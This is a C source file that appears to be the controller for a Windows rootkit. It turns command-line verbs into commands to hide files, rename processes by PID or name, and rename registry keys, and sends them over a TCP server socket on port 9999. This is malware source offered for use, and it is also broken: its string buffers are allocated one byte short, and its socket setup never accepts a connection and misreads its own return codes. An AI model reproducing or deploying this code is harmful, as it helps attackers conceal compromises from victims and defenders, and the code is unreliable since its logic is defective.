#define _CRT_SECURE_NO_WARNINGS
#include <WinSock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include ".\..\command.h"

#pragma comment (lib, "Ws2_32.lib")

#define SERVER_PORT		9999
#define SEND_OK			"OK"
#define SEND_FAIL		"FAIL"

SOCKET lsocket;
SOCKET csocket;

int InitSocket();
int StartServer();

int main(int argc, char* argv[]) {
	COMMAND cmd;
	unsigned int len;

	if (argc > 1) {
		if (!strcmp(argv[1], "0x26")) {
			cmd.flags = COMMAND_TEST_COMMAND;
			cmd.target = NULL;
			cmd.change = NULL;

		}
		// RENAME PROCESS PID
		else if (!strcmp(argv[1], "rpid")) {
			if (argc == 4) {
				len = strlen(argv[3]);
				cmd.change = malloc(len);
				strcpy((char*)cmd.change, argv[3]);

				cmd.target = (void*)strtoul(argv[2], NULL, 0);
				cmd.flags = COMMAND_RENAME_PROCESS | COMMAND_BUFFER_NUMBER;

			}
			else printf("Error rename process\n");
		}
		// RENAME PROCESS NAME
		else if (!strcmp(argv[1], "rname")) {
			if (argc == 4) {
				len = strlen(argv[2]);
				cmd.target = malloc(len);
				strcpy((char*)cmd.target, argv[2]);

				len = strlen(argv[3]);
				cmd.change = malloc(len);
				strcpy((char*)cmd.change, argv[3]);

				cmd.flags = COMMAND_RENAME_PROCESS | COMMAND_BUFFER_POINTER;

			}
			else printf("Error rename process\n");
		}
		// HIDE FILE
		else if (!strcmp(argv[1], "hfile")) {
			if (argc == 3) {
				len = strlen(argv[2]);
				cmd.target = malloc(len);
				strcpy((char*)cmd.target, argv[2]);

				cmd.flags = COMMAND_HIDE_FILE | COMMAND_BUFFER_POINTER;

				cmd.change = NULL;

			}
			else printf("Error hide file\n");
		}
		// RENAME KEY
		else if (!strcmp(argv[1], "key")) {
			if (argc == 4) {
				len = strlen(argv[2]);
				cmd.target = malloc(len);
				strcpy((char*)cmd.target, argv[2]);

				len = strlen(argv[3]);
				cmd.change = malloc(len);
				strcpy((char*)cmd.change, argv[3]);

				cmd.flags = COMMAND_RENAME_KEY | COMMAND_BUFFER_POINTER;

			}
			else printf("Error hide add key\n");
		}
	}
	else {
		printf("\t\n%s command [argCommand1 [argCommand2 [...]]]\n", argv[0]);
	}

	if (!InitSocket()) {
		return 1;
	}

	if (!StartServer()) {
		return 1;
	}
	int ires;
	int iSendResult;
	do {
		iSendResult = send(csocket, (char*)&cmd, sizeof(COMMAND), 0);
		if (iSendResult == SOCKET_ERROR) {
			printf("send failed with error: %d\n", WSAGetLastError());
			closesocket(csocket);
			WSACleanup();
		}
		printf("Bytes sent: %d\n", iSendResult);

		system("pause");

	} while (TRUE);


	// shutdown the connection since we're done
	ires = shutdown(csocket, SD_SEND);
	if (ires == SOCKET_ERROR) {
		printf("shutdown failed with error: %d\n", WSAGetLastError());
		closesocket(csocket);
		WSACleanup();
		return ires;
	}

	// cleanup
	closesocket(csocket);
	WSACleanup();

	return 0;
}

int InitSocket() {
	WSADATA wsaData;
	int ires = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (ires != 0) {
		printf("WSAStartup exit with code %d\n", ires);
		return ires;
	}
}

int StartServer() {
	int ires;
	ADDRINFOA hints;
	PADDRINFOA result;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	ires = getaddrinfo(NULL, "9999", &hints, &result);
	if (ires != 0) {
		printf("getaddrinfo failed with error: %d\n", ires);
		WSACleanup();
		return ires;
	}

	lsocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (lsocket == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}

	// Setup the TCP listening socket
	ires = bind(lsocket, result->ai_addr, (int)result->ai_addrlen);
	if (ires == SOCKET_ERROR) {
		printf("bind failed with error: %d\n", WSAGetLastError());
		freeaddrinfo(result);
		closesocket(lsocket);
		WSACleanup();
		return ires;
	}

	freeaddrinfo(result);

	ires = listen(lsocket, SOMAXCONN);
	if (ires == SOCKET_ERROR) {
		printf("listen failed with error: %d\n", WSAGetLastError());
		closesocket(lsocket);
		WSACleanup();
		return ires;
	}

	closesocket(lsocket);
	return 0;
}